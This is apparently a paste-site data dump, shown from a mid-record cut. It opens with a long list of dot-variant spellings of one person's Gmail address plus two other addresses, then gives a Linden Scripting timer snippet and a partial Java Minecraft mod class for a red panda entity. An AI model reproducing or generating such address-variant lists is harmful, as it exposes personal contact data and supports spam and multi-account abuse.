<a href=""mailto:m.i.rac.must.afa2.3.2@gmail.com"">m.i.rac.must.afa2.3.2@gmail.com</a>
<a href=""mailto:m.ir.ac.mu.s.ta.fa23.2@gmail.com"">m.ir.ac.mu.s.ta.fa23.2@gmail.com</a>
<a href=""mailto:mi.r.a.c.m.u.s.ta.f.a.2.3.2@gmail.com"">mi.r.a.c.m.u.s.ta.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mi.racmus.t.a.fa.23.2@gmail.com"">mi.racmus.t.a.fa.23.2@gmail.com</a>
<a href=""mailto:mi.racmu.sta.f.a2.32@gmail.com"">mi.racmu.sta.f.a2.32@gmail.com</a>
<a href=""mailto:m.i.racm.u.staf.a.23.2@gmail.com"">m.i.racm.u.staf.a.23.2@gmail.com</a>
<a href=""mailto:mi.racm.ustaf.a2.3.2@gmail.com"">mi.racm.ustaf.a2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.c.m.u.s.t.a.f.a23.2@gmail.com"">mi.ra.c.m.u.s.t.a.f.a23.2@gmail.com</a>
<a href=""mailto:m.i.ra.c.mustaf.a232@gmail.com"">m.i.ra.c.mustaf.a232@gmail.com</a>
<a href=""mailto:m.i.ra.c.mus.ta.fa23.2@gmail.com"">m.i.ra.c.mus.ta.fa23.2@gmail.com</a>
<a href=""mailto:miracmus.taf.a.2.3.2@gmail.com"">miracmus.taf.a.2.3.2@gmail.com</a>
<a href=""mailto:m.ira.cmust.afa23.2@gmail.com"">m.ira.cmust.afa23.2@gmail.com</a>
<a href=""mailto:miracmu.s.t.a.fa2.3.2@gmail.com"">miracmu.s.t.a.fa2.3.2@gmail.com</a>
<a href=""mailto:m.i.rac.musta.f.a.23.2@gmail.com"">m.i.rac.musta.f.a.23.2@gmail.com</a>
<a href=""mailto:m.ira.c.mus.t.af.a.23.2@gmail.com"">m.ira.c.mus.t.af.a.23.2@gmail.com</a>
<a href=""mailto:mirac.m.u.st.a.f.a.2.3.2@gmail.com"">mirac.m.u.st.a.f.a.2.3.2@gmail.com</a>
<a href=""mailto:m.i.rac.m.u.s.ta.f.a2.3.2@gmail.com"">m.i.rac.m.u.s.ta.f.a2.3.2@gmail.com</a>
<a href=""mailto:mir.ac.m.u.s.taf.a23.2@gmail.com"">mir.ac.m.u.s.taf.a23.2@gmail.com</a>
<a href=""mailto:mirac.m.ust.afa2.32@gmail.com"">mirac.m.ust.afa2.32@gmail.com</a>
<a href=""mailto:mi.r.a.c.m.u.sta.fa.2.3.2@gmail.com"">mi.r.a.c.m.u.sta.fa.2.3.2@gmail.com</a>
<a href=""mailto:mir.acm.ust.af.a2.3.2@gmail.com"">mir.acm.ust.af.a2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.a.cmust.afa2.32@gmail.com"">m.i.r.a.cmust.afa2.32@gmail.com</a>
<a href=""mailto:mir.a.cm.ust.a.fa23.2@gmail.com"">mir.a.cm.ust.a.fa23.2@gmail.com</a>
<a href=""mailto:m.i.r.ac.musta.fa2.32@gmail.com"">m.i.r.ac.musta.fa2.32@gmail.com</a>
<a href=""mailto:mi.ra.cm.us.t.a.f.a.2.3.2@gmail.com"">mi.ra.cm.us.t.a.f.a.2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.acm.us.t.afa2.32@gmail.com"">m.i.r.acm.us.t.afa2.32@gmail.com</a>
<a href=""mailto:m.i.ra.c.m.u.s.t.afa.2.3.2@gmail.com"">m.i.ra.c.m.u.s.t.afa.2.3.2@gmail.com</a>
<a href=""mailto:mira.c.m.u.s.t.a.f.a.232@gmail.com"">mira.c.m.u.s.t.a.f.a.232@gmail.com</a>
<a href=""mailto:mi.r.a.cm.u.s.t.a.fa2.3.2@gmail.com"">mi.r.a.cm.u.s.t.a.fa2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.acmu.st.af.a.2.32@gmail.com"">m.i.r.acmu.st.af.a.2.32@gmail.com</a>
<a href=""mailto:mira.c.mu.s.t.af.a232@gmail.com"">mira.c.mu.s.t.af.a232@gmail.com</a>
<a href=""mailto:m.irac.mu.s.t.afa.2.3.2@gmail.com"">m.irac.mu.s.t.afa.2.3.2@gmail.com</a>
<a href=""mailto:m.ir.a.cmust.af.a.232@gmail.com"">m.ir.a.cmust.af.a.232@gmail.com</a>
<a href=""mailto:m.irac.mu.s.taf.a232@gmail.com"">m.irac.mu.s.taf.a232@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.staf.a232@gmail.com"">m.ir.ac.m.u.staf.a232@gmail.com</a>
<a href=""mailto:mi.r.acmu.s.t.a.f.a.2.3.2@gmail.com"">mi.r.acmu.s.t.a.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mi.r.a.cm.ust.af.a.2.3.2@gmail.com"">mi.r.a.cm.ust.af.a.2.3.2@gmail.com</a>
<a href=""mailto:m.i.ra.c.m.u.sta.f.a.23.2@gmail.com"">m.i.ra.c.m.u.sta.f.a.23.2@gmail.com</a>
<a href=""mailto:m.iracm.us.t.a.fa.2.32@gmail.com"">m.iracm.us.t.a.fa.2.32@gmail.com</a>
<a href=""mailto:mi.ra.cm.us.taf.a.2.32@gmail.com"">mi.ra.cm.us.taf.a.2.32@gmail.com</a>
<a href=""mailto:m.irac.mus.ta.fa2.3.2@gmail.com"">m.irac.mus.ta.fa2.3.2@gmail.com</a>
<a href=""mailto:m.irac.m.ustafa.23.2@gmail.com"">m.irac.m.ustafa.23.2@gmail.com</a>
<a href=""mailto:m.ira.cm.ust.af.a232@gmail.com"">m.ira.cm.ust.af.a232@gmail.com</a>
<a href=""mailto:m.ir.ac.m.ustaf.a.23.2@gmail.com"">m.ir.ac.m.ustaf.a.23.2@gmail.com</a>
<a href=""mailto:miracmust.afa23.2@gmail.com"">miracmust.afa23.2@gmail.com</a>
<a href=""mailto:miracmust.a.fa2.32@gmail.com"">miracmust.a.fa2.32@gmail.com</a>
<a href=""mailto:mir.a.cm.u.s.ta.f.a.2.32@gmail.com"">mir.a.cm.u.s.ta.f.a.2.32@gmail.com</a>
<a href=""mailto:m.ir.acm.u.s.taf.a.2.3.2@gmail.com"">m.ir.acm.u.s.taf.a.2.3.2@gmail.com</a>
<a href=""mailto:mir.acmu.s.t.afa232@gmail.com"">mir.acmu.s.t.afa232@gmail.com</a>
<a href=""mailto:m.ir.a.cmust.a.fa2.32@gmail.com"">m.ir.a.cmust.a.fa2.32@gmail.com</a>
<a href=""mailto:m.i.racm.u.stafa2.32@gmail.com"">m.i.racm.u.stafa2.32@gmail.com</a>
<a href=""mailto:m.i.r.acmust.afa2.3.2@gmail.com"">m.i.r.acmust.afa2.3.2@gmail.com</a>
<a href=""mailto:m.i.racmustafa.23.2@gmail.com"">m.i.racmustafa.23.2@gmail.com</a>
<a href=""mailto:mira.c.m.u.s.tafa.232@gmail.com"">mira.c.m.u.s.tafa.232@gmail.com</a>
<a href=""mailto:m.ir.a.c.mu.stafa.2.3.2@gmail.com"">m.ir.a.c.mu.stafa.2.3.2@gmail.com</a>
<a href=""mailto:mira.cmu.s.taf.a.2.3.2@gmail.com"">mira.cmu.s.taf.a.2.3.2@gmail.com</a>
<a href=""mailto:m.irac.mu.s.t.a.fa.23.2@gmail.com"">m.irac.mu.s.t.a.fa.23.2@gmail.com</a>
<a href=""mailto:mi.ra.c.mu.s.t.af.a2.3.2@gmail.com"">mi.ra.c.mu.s.t.af.a2.3.2@gmail.com</a>
<a href=""mailto:m.ir.a.cmus.t.af.a.2.3.2@gmail.com"">m.ir.a.cmus.t.af.a.2.3.2@gmail.com</a>
<a href=""mailto:m.i.ra.cmus.ta.f.a.2.3.2@gmail.com"">m.i.ra.cmus.ta.f.a.2.3.2@gmail.com</a>
<a href=""mailto:m.ir.ac.mu.s.tafa.232@gmail.com"">m.ir.ac.mu.s.tafa.232@gmail.com</a>
<a href=""mailto:mi.ra.c.mu.s.t.a.f.a2.3.2@gmail.com"">mi.ra.c.mu.s.t.a.f.a2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.acm.us.taf.a2.3.2@gmail.com"">m.i.r.acm.us.taf.a2.3.2@gmail.com</a>
<a href=""mailto:mirac.musta.fa.23.2@gmail.com"">mirac.musta.fa.23.2@gmail.com</a>
<a href=""mailto:m.i.racmus.ta.f.a2.3.2@gmail.com"">m.i.racmus.ta.f.a2.3.2@gmail.com</a>
<a href=""mailto:mirac.musta.fa.2.3.2@gmail.com"">mirac.musta.fa.2.3.2@gmail.com</a>
<a href=""mailto:m.ira.cm.us.t.afa.232@gmail.com"">m.ira.cm.us.t.afa.232@gmail.com</a>
<a href=""mailto:mi.r.a.c.mus.t.af.a2.3.2@gmail.com"">mi.r.a.c.mus.t.af.a2.3.2@gmail.com</a>
<a href=""mailto:mir.acm.u.st.afa.2.3.2@gmail.com"">mir.acm.u.st.afa.2.3.2@gmail.com</a>
<a href=""mailto:mir.acmu.stafa.2.3.2@gmail.com"">mir.acmu.stafa.2.3.2@gmail.com</a>
<a href=""mailto:m.ira.cm.u.st.a.fa232@gmail.com"">m.ira.cm.u.st.a.fa232@gmail.com</a>
<a href=""mailto:mi.racm.usta.f.a23.2@gmail.com"">mi.racm.usta.f.a23.2@gmail.com</a>
<a href=""mailto:m.i.r.acm.usta.f.a232@gmail.com"">m.i.r.acm.usta.f.a232@gmail.com</a>
<a href=""mailto:mi.rac.m.ustafa23.2@gmail.com"">mi.rac.m.ustafa23.2@gmail.com</a>
<a href=""mailto:mi.r.ac.mu.s.t.a.f.a2.3.2@gmail.com"">mi.r.ac.mu.s.t.a.f.a2.3.2@gmail.com</a>
<a href=""mailto:m.ir.a.cm.usta.f.a23.2@gmail.com"">m.ir.a.cm.usta.f.a23.2@gmail.com</a>
<a href=""mailto:m.i.ra.c.mu.stafa2.3.2@gmail.com"">m.i.ra.c.mu.stafa2.3.2@gmail.com</a>
<a href=""mailto:mi.r.ac.mu.sta.fa2.32@gmail.com"">mi.r.ac.mu.sta.fa2.32@gmail.com</a>
<a href=""mailto:mi.ra.cm.u.s.tafa.23.2@gmail.com"">mi.ra.cm.u.s.tafa.23.2@gmail.com</a>
<a href=""mailto:miracmu.st.a.fa2.32@gmail.com"">miracmu.st.a.fa2.32@gmail.com</a>
<a href=""mailto:m.i.ra.cm.us.ta.fa232@gmail.com"">m.i.ra.cm.us.ta.fa232@gmail.com</a>
<a href=""mailto:mira.cmu.s.ta.fa.23.2@gmail.com"">mira.cmu.s.ta.fa.23.2@gmail.com</a>
<a href=""mailto:m.i.r.a.c.mu.s.t.afa2.32@gmail.com"">m.i.r.a.c.mu.s.t.afa2.32@gmail.com</a>
<a href=""mailto:m.iracmu.sta.f.a2.32@gmail.com"">m.iracmu.sta.f.a2.32@gmail.com</a>
<a href=""mailto:mir.a.cm.u.s.t.a.f.a.2.3.2@gmail.com"">mir.a.cm.u.s.t.a.f.a.2.3.2@gmail.com</a>
<a href=""mailto:m.ir.a.c.musta.f.a2.32@gmail.com"">m.ir.a.c.musta.f.a2.32@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.s.tafa23.2@gmail.com"">m.ir.ac.m.u.s.tafa23.2@gmail.com</a>
<a href=""mailto:m.ir.acm.u.stafa.232@gmail.com"">m.ir.acm.u.stafa.232@gmail.com</a>
<a href=""mailto:m.i.ra.c.m.u.s.ta.fa.232@gmail.com"">m.i.ra.c.m.u.s.ta.fa.232@gmail.com</a>
<a href=""mailto:m.i.r.a.c.m.u.st.a.f.a2.3.2@gmail.com"">m.i.r.a.c.m.u.st.a.f.a2.3.2@gmail.com</a>
<a href=""mailto:mi.r.ac.m.u.s.tafa.2.3.2@gmail.com"">mi.r.ac.m.u.s.tafa.2.3.2@gmail.com</a>
<a href=""mailto:mira.cm.us.t.af.a232@gmail.com"">mira.cm.us.t.af.a232@gmail.com</a>
<a href=""mailto:mi.rac.mus.t.afa.2.3.2@gmail.com"">mi.rac.mus.t.afa.2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.cmustafa23.2@gmail.com"">mi.ra.cmustafa23.2@gmail.com</a>
<a href=""mailto:mi.r.a.cm.u.s.t.afa.232@gmail.com"">mi.r.a.cm.u.s.t.afa.232@gmail.com</a>
<a href=""mailto:miracm.us.t.afa2.3.2@gmail.com"">miracm.us.t.afa2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.c.m.u.staf.a2.32@gmail.com"">mi.ra.c.m.u.staf.a2.32@gmail.com</a>
<a href=""mailto:mi.ra.c.m.us.ta.f.a2.3.2@gmail.com"">mi.ra.c.m.us.ta.f.a2.3.2@gmail.com</a>
<a href=""mailto:m.ir.acm.us.ta.f.a.232@gmail.com"">m.ir.acm.us.ta.f.a.232@gmail.com</a>
<a href=""mailto:m.i.rac.m.u.staf.a.23.2@gmail.com"">m.i.rac.m.u.staf.a.23.2@gmail.com</a>
<a href=""mailto:m.ira.cmu.s.t.af.a2.3.2@gmail.com"">m.ira.cmu.s.t.af.a2.3.2@gmail.com</a>
<a href=""mailto:m.iracm.us.tafa232@gmail.com"">m.iracm.us.tafa232@gmail.com</a>
<a href=""mailto:m.i.r.acmus.t.af.a.23.2@gmail.com"">m.i.r.acmus.t.af.a.23.2@gmail.com</a>
<a href=""mailto:mi.r.a.c.m.u.s.t.a.f.a2.3.2@gmail.com"">mi.r.a.c.m.u.s.t.a.f.a2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.c.m.u.st.a.f.a.232@gmail.com"">mi.ra.c.m.u.st.a.f.a.232@gmail.com</a>
<a href=""mailto:mi.r.acmus.t.a.f.a2.32@gmail.com"">mi.r.acmus.t.a.f.a2.32@gmail.com</a>
<a href=""mailto:m.ir.acmu.s.tafa23.2@gmail.com"">m.ir.acmu.s.tafa23.2@gmail.com</a>
<a href=""mailto:mi.r.ac.mu.st.a.fa.23.2@gmail.com"">mi.r.ac.mu.st.a.fa.23.2@gmail.com</a>
<a href=""mailto:mi.ra.c.m.us.t.a.f.a23.2@gmail.com"">mi.ra.c.m.us.t.a.f.a23.2@gmail.com</a>
<a href=""mailto:mi.rac.m.u.st.a.fa23.2@gmail.com"">mi.rac.m.u.st.a.fa23.2@gmail.com</a>
<a href=""mailto:m.ir.a.cmus.tafa232@gmail.com"">m.ir.a.cmus.tafa232@gmail.com</a>
<a href=""mailto:mir.a.cm.u.stafa.23.2@gmail.com"">mir.a.cm.u.stafa.23.2@gmail.com</a>
<a href=""mailto:mir.a.cmus.taf.a23.2@gmail.com"">mir.a.cmus.taf.a23.2@gmail.com</a>
<a href=""mailto:mir.ac.m.us.tafa23.2@gmail.com"">mir.ac.m.us.tafa23.2@gmail.com</a>
<a href=""mailto:m.ir.a.cmu.s.ta.f.a.232@gmail.com"">m.ir.a.cmu.s.ta.f.a.232@gmail.com</a>
<a href=""mailto:mir.acmu.stafa2.3.2@gmail.com"">mir.acmu.stafa2.3.2@gmail.com</a>
<a href=""mailto:m.i.racm.us.ta.f.a.2.3.2@gmail.com"">m.i.racm.us.ta.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mir.acmu.s.taf.a232@gmail.com"">mir.acmu.s.taf.a232@gmail.com</a>
<a href=""mailto:m.i.ra.c.m.u.st.af.a2.32@gmail.com"">m.i.ra.c.m.u.st.af.a2.32@gmail.com</a>
<a href=""mailto:mi.r.a.cmustafa232@gmail.com"">mi.r.a.cmustafa232@gmail.com</a>
<a href=""mailto:m.ir.a.cm.u.s.ta.fa.232@gmail.com"">m.ir.a.cm.u.s.ta.fa.232@gmail.com</a>
<a href=""mailto:mirac.musta.fa232@gmail.com"">mirac.musta.fa232@gmail.com</a>
<a href=""mailto:m.i.ra.cm.u.s.taf.a2.32@gmail.com"">m.i.ra.cm.u.s.taf.a2.32@gmail.com</a>
<a href=""mailto:mir.ac.m.u.st.afa23.2@gmail.com"">mir.ac.m.u.st.afa23.2@gmail.com</a>
<a href=""mailto:m.i.racmu.st.a.fa2.32@gmail.com"">m.i.racmu.st.a.fa2.32@gmail.com</a>
<a href=""mailto:mira.cm.ustaf.a2.32@gmail.com"">mira.cm.ustaf.a2.32@gmail.com</a>
<a href=""mailto:m.i.r.a.c.m.u.st.afa2.32@gmail.com"">m.i.r.a.c.m.u.st.afa2.32@gmail.com</a>
<a href=""mailto:m.ira.cmu.sta.fa.23.2@gmail.com"">m.ira.cmu.sta.fa.23.2@gmail.com</a>
<a href=""mailto:mir.a.c.mu.s.ta.f.a.2.3.2@gmail.com"">mir.a.c.mu.s.ta.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mi.r.a.c.m.u.s.t.afa2.3.2@gmail.com"">mi.r.a.c.m.u.s.t.afa2.3.2@gmail.com</a>
<a href=""mailto:mi.racmu.s.tafa.23.2@gmail.com"">mi.racmu.s.tafa.23.2@gmail.com</a>
<a href=""mailto:m.irac.mus.ta.fa232@gmail.com"">m.irac.mus.ta.fa232@gmail.com</a>
<a href=""mailto:m.i.ra.cm.ust.afa23.2@gmail.com"">m.i.ra.cm.ust.afa23.2@gmail.com</a>
<a href=""mailto:m.i.ra.cmu.s.t.a.fa.2.3.2@gmail.com"">m.i.ra.cmu.s.t.a.fa.2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.cm.us.t.afa.232@gmail.com"">mi.ra.cm.us.t.afa.232@gmail.com</a>
<a href=""mailto:miracmus.tafa23.2@gmail.com"">miracmus.tafa23.2@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.s.t.a.fa.23.2@gmail.com"">m.ir.ac.m.u.s.t.a.fa.23.2@gmail.com</a>
<a href=""mailto:m.ir.ac.mus.taf.a232@gmail.com"">m.ir.ac.mus.taf.a232@gmail.com</a>
<a href=""mailto:mi.r.acmu.s.ta.f.a2.32@gmail.com"">mi.r.acmu.s.ta.f.a2.32@gmail.com</a>
<a href=""mailto:m.i.r.a.cmu.stafa2.32@gmail.com"">m.i.r.a.cmu.stafa2.32@gmail.com</a>
<a href=""mailto:mi.r.a.cmus.t.af.a2.32@gmail.com"">mi.r.a.cmus.t.af.a2.32@gmail.com</a>
<a href=""mailto:mi.r.a.cmustaf.a23.2@gmail.com"">mi.r.a.cmustaf.a23.2@gmail.com</a>
<a href=""mailto:mi.r.ac.m.u.sta.f.a.232@gmail.com"">mi.r.ac.m.u.sta.f.a.232@gmail.com</a>
<a href=""mailto:mir.ac.mustafa.2.3.2@gmail.com"">mir.ac.mustafa.2.3.2@gmail.com</a>
<a href=""mailto:m.ir.a.c.mu.st.afa.2.32@gmail.com"">m.ir.a.c.mu.st.afa.2.32@gmail.com</a>
<a href=""mailto:mi.r.ac.musta.f.a232@gmail.com"">mi.r.ac.musta.f.a232@gmail.com</a>
<a href=""mailto:m.ir.acm.ust.afa2.32@gmail.com"">m.ir.acm.ust.afa2.32@gmail.com</a>
<a href=""mailto:mir.a.c.m.u.sta.f.a.23.2@gmail.com"">mir.a.c.m.u.sta.f.a.23.2@gmail.com</a>
<a href=""mailto:mi.rac.mu.st.a.f.a2.32@gmail.com"">mi.rac.mu.st.a.f.a2.32@gmail.com</a>
<a href=""mailto:mi.r.a.c.mu.stafa2.3.2@gmail.com"">mi.r.a.c.mu.stafa2.3.2@gmail.com</a>
<a href=""mailto:m.i.rac.musta.f.a232@gmail.com"">m.i.rac.musta.f.a232@gmail.com</a>
<a href=""mailto:mi.r.acmustaf.a.2.3.2@gmail.com"">mi.r.acmustaf.a.2.3.2@gmail.com</a>
<a href=""mailto:m.iracmu.s.taf.a232@gmail.com"">m.iracmu.s.taf.a232@gmail.com</a>
<a href=""mailto:m.i.r.a.cm.u.s.t.af.a.2.3.2@gmail.com"">m.i.r.a.cm.u.s.t.af.a.2.3.2@gmail.com</a>
<a href=""mailto:m.ira.c.m.us.t.a.f.a232@gmail.com"">m.ira.c.m.us.t.a.f.a232@gmail.com</a>
<a href=""mailto:m.ira.cmu.staf.a.232@gmail.com"">m.ira.cmu.staf.a.232@gmail.com</a>
<a href=""mailto:m.i.rac.m.u.s.ta.f.a.232@gmail.com"">m.i.rac.m.u.s.ta.f.a.232@gmail.com</a>
<a href=""mailto:mi.r.a.cm.u.s.tafa.232@gmail.com"">mi.r.a.cm.u.s.tafa.232@gmail.com</a>
<a href=""mailto:m.ir.a.cm.ust.af.a23.2@gmail.com"">m.ir.a.cm.ust.af.a23.2@gmail.com</a>
<a href=""mailto:m.i.r.acmu.s.ta.f.a2.32@gmail.com"">m.i.r.acmu.s.ta.f.a2.32@gmail.com</a>
<a href=""mailto:mirac.mu.s.tafa.2.32@gmail.com"">mirac.mu.s.tafa.2.32@gmail.com</a>
<a href=""mailto:mirac.mu.staf.a23.2@gmail.com"">mirac.mu.staf.a23.2@gmail.com</a>
<a href=""mailto:mi.racm.us.t.af.a.2.3.2@gmail.com"">mi.racm.us.t.af.a.2.3.2@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.staf.a2.32@gmail.com"">m.ir.ac.m.u.staf.a2.32@gmail.com</a>
<a href=""mailto:m.ir.a.c.mu.st.a.fa.23.2@gmail.com"">m.ir.a.c.mu.st.a.fa.23.2@gmail.com</a>
<a href=""mailto:m.ir.a.c.mu.s.t.af.a232@gmail.com"">m.ir.a.c.mu.s.t.af.a232@gmail.com</a>
<a href=""mailto:m.i.r.acmu.s.ta.fa.2.3.2@gmail.com"">m.i.r.acmu.s.ta.fa.2.3.2@gmail.com</a>
<a href=""mailto:mi.racmus.t.a.f.a.2.3.2@gmail.com"">mi.racmus.t.a.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mi.r.a.cmu.st.af.a2.32@gmail.com"">mi.r.a.cmu.st.af.a2.32@gmail.com</a>
<a href=""mailto:mi.r.a.c.must.af.a.232@gmail.com"">mi.r.a.c.must.af.a.232@gmail.com</a>
<a href=""mailto:mi.r.acmu.stafa232@gmail.com"">mi.r.acmu.stafa232@gmail.com</a>
<a href=""mailto:m.i.ra.c.mus.t.a.fa2.3.2@gmail.com"">m.i.ra.c.mus.t.a.fa2.3.2@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.st.afa232@gmail.com"">m.ir.ac.m.u.st.afa232@gmail.com</a>
<a href=""mailto:mi.ra.cmu.s.t.af.a2.32@gmail.com"">mi.ra.cmu.s.t.af.a2.32@gmail.com</a>
<a href=""mailto:820124@csrc-cn.com"">820124@csrc-cn.com</a>
<a href=""mailto:6f2a0b6ad78144048dff9920adebd436.protect@withheldforprivacy.com"">6f2a0b6ad78144048dff9920adebd436.protect@withheldforprivacy.com</a>"
h22PpJKh,MJ Hammer,bleuderp,Linden Scripting,Sunday 7th of January 2024 12:30:18 AM CDT,"integer second_timer = 0x7FFFFFFF;	//- BIG value you don't have to worry about until 2038

default
{
	state_entry()
	{
		llSetTimerEvent(60);

		// set the second timer to go off in three minutes
		second_timer = llGetUnixTime() + 3*60;
	}

	timer()
	{
		if ( second_timer <= llGetUnixTime() )
		{
			do_the_second_timer_thing();
			second_timer = 0x7FFFFFFF;
		}
	}
}"
rThLkH7U,Red Panda 0.2,jayhillx,Java,Saturday 6th of January 2024 11:49:02 PM CDT,"package com.mysticsbiomes.common.entity.animal;

import com.mysticsbiomes.init.MysticEntities;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.syncher.EntityDataAccessor;
import net.minecraft.network.syncher.EntityDataSerializers;
import net.minecraft.network.syncher.SynchedEntityData;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.util.ByIdMap;
import net.minecraft.util.RandomSource;
import net.minecraft.util.StringRepresentable;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResult;
import net.minecraft.world.entity.*;
import net.minecraft.world.entity.ai.attributes.AttributeSupplier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.ai.control.LookControl;
import net.minecraft.world.entity.ai.control.MoveControl;
import net.minecraft.world.entity.ai.goal.*;
import net.minecraft.world.entity.animal.*;
import net.minecraft.world.entity.monster.Monster;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.crafting.Ingredient;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.block.Blocks;

import javax.annotation.Nullable;
import java.util.EnumSet;
import java.util.function.IntFunction;

/**
 * Red Pandas spawn in the Bamboo Blossom Forest, scouting out bamboo, and stealing items.
 */
public class RedPanda extends Animal {
    private static final EntityDataAccessor<Byte> MAIN_GENE_ID = SynchedEntityData.defineId(RedPanda.class, EntityDataSerializers.BYTE);
    private static final EntityDataAccessor<Byte> HIDDEN_GENE_ID = SynchedEntityData.defineId(RedPanda.class, EntityDataSerializers.BYTE);
    private static final EntityDataAccessor<Byte> DATA_FLAGS_ID = SynchedEntityData.defineId(RedPanda.class, EntityDataSerializers.BYTE);
    private int ticksSinceLastTimeStanding;

    public final AnimationState sleepingAnimationState = new AnimationState();
    public final AnimationState standingPoseAnimationState = new AnimationState();

    public RedPanda(EntityType<? extends RedPanda> type, Level level) {
        super(type, level);
        this.moveControl = new MoveControl(this);
        this.lookControl = new LookControl(this);
    }

    protected void defineSynchedData() {
        super.defineSynchedData();
        this.entityData.define(MAIN_GENE_ID, (byte)0);
        this.entityData.define(HIDDEN_GENE_ID, (byte)0);
        this.entityData.define(DATA_FLAGS_ID, (byte)0);
    }

    protected void registerGoals() {
        this.goalSelector.addGoal(0, new FloatGoal(this));
        this.goalSelector.addGoal(0, new RedPanda.StandUpGoal());
        this.goalSelector.addGoal(1, new PanicGoal(this, 2.0));
        this.goalSelector.addGoal(1, new BreedGoal(this, 1.0));
        this.goalSelector.addGoal(2, new RedPanda.AttackGoal(this, 1.2F, true));
        this.goalSelector.addGoal(3, new TemptGoal(this, 1.0, Ingredient.of(Blocks.BAMBOO.asItem()), false));
        this.goalSelector.addGoal(4, new AvoidEntityGoal<>(this, Monster.class, 4.0F, 2.0, 2.0));
        this.goalSelector.addGoal(5, new LookAtPlayerGoal(this, Player.class, 6.0F));
        this.goalSelector.addGoal(6, new RandomLookAroundGoal(this));
        this.goalSelector.addGoal(7, new RedPanda.SleepGoal());
        this.goalSelector.addGoal(8, new FollowParentGoal(this, 1.25));
        this.goalSelector.addGoal(9, new WaterAvoidingRandomStrollGoal(this, 1.0));
    }

    public static AttributeSupplier.Builder createAttributes() {
        return Mob.createMobAttributes().add(Attributes.MOVEMENT_SPEED, 1.0F).add(Attributes.MAX_HEALTH, 10.0D).add(Attributes.FOLLOW_RANGE, 32.0D).add(Attributes.ATTACK_DAMAGE, 8.0D);
    }

    public void setAttributes() {
        if (this.isEnergetic()) {
            this.getAttribute(Attributes.MOVEMENT_SPEED).setBaseValue(1.1F);
        }

        if (this.isLazy()) {
            this.getAttribute(Attributes.MOVEMENT_SPEED).setBaseValue(0.1F);
        }
    }

    public RedPanda getBreedOffspring(ServerLevel level, AgeableMob mob) {
        RedPanda redPanda = MysticEntities.RED_PANDA.get().create(level);
        if (redPanda != null) {
            if (mob instanceof RedPanda parent) {
                redPanda.setGeneFromParents(this, parent);
            }

            redPanda.setAttributes();
        }
        return redPanda;
    }

    public EntityDimensions getDimensions(Pose pose) {
        return pose == Pose.STANDING ? EntityDimensions.scalable(0.5F, 1.125F) : super.getDimensions(pose);
    }

    protected float getStandingEyeHeight(Pose pose, EntityDimensions dimensions) {
        return pose == Pose.STANDING ? 1.0F : super.getStandingEyeHeight(pose, dimensions);
    }

    /////////////////////////////////////////////////////////////////////////////////

    public void addAdditionalSaveData(CompoundTag tag) {
        super.addAdditionalSaveData(tag);
        tag.putBoolean(""IsSleeping"", this.isSleeping());

        tag.putString(""MainGene"", this.getMainGene().getSerializedName());
        tag.putString(""HiddenGene"", this.getHiddenGene().getSerializedName());
    }

    public void readAdditionalSaveData(CompoundTag tag) {
        super.readAdditionalSaveData(tag);
        this.setSleeping(tag.getBoolean(""IsSleeping""));

        this.setMainGene(Gene.byName(tag.getString(""MainGene"")));
        this.setHiddenGene(Gene.byName(tag.getString(""HiddenGene"")));
    }

    /////////////////////////////////////////////////////////////////////////////////

    public Gene getMainGene() {
        return Gene.byId(this.entityData.get(MAIN_GENE_ID));
    }

    public void setMainGene(Gene gene) {
        if (gene.getId() > 6) {
            gene = Gene.getRandom(this.random);
        }

        this.entityData.set(MAIN_GENE_ID, (byte)gene.getId());
    }

    public Gene getHiddenGene() {
        return Gene.byId(this.entityData.get(HIDDEN_GENE_ID));
    }

    public void setHiddenGene(Gene gene) {
        if (gene.getId() > 6) {
            gene = Gene.getRandom(this.random);
        }

        this.entityData.set(HIDDEN_GENE_ID, (byte)gene.getId());
    }

    public void setGeneFromParents(RedPanda parent, @Nullable RedPanda parent2) {
        if (parent2 == null) {
            if (this.random.nextBoolean()) {
                this.setMainGene(parent.getOneOfGenesRandomly());
                this.setHiddenGene(Gene.getRandom(this.random));
            } else {
                this.setMainGene(Gene.getRandom(this.random));
                this.setHiddenGene(parent.getOneOfGenesRandomly());
            }
        } else if (this.random.nextBoolean()) {
            this.setMainGene(parent.getOneOfGenesRandomly());
            this.setHiddenGene(parent2.getOneOfGenesRandomly());
        } else {
            this.setMainGene(parent2.getOneOfGenesRandomly());
            this.setHiddenGene(parent.getOneOfGenesRandomly());
        }

        if (this.random.nextInt(32) == 0) {
            this.setMainGene(Gene.getRandom(this.random));
        }

        if (this.random.nextInt(32) == 0) {
            this.setHiddenGene(Gene.getRandom(this.random));
        }
    }

    private Gene getOneOfGenesRandomly() {
        return this.random.nextBoolean() ? this.getMainGene() : this.getHiddenGene();
    }

    public Gene getVariant() {
        return Gene.getVariantFromGenes(this.getMainGene(), this.getHiddenGene());
    }

    public boolean isEnergetic() {
        return this.getVariant() == Gene.ENERGETIC;
    }

    public boolean isLazy() {
        return this.getVariant() == Gene.LAZY;
    }

    public boolean isCurious() {
        return this.getVariant() == Gene.CURIOUS;
    }

    public boolean isClingy() {
        return this.getVariant() == Gene.CLINGY;
    }

    public boolean isShy() {
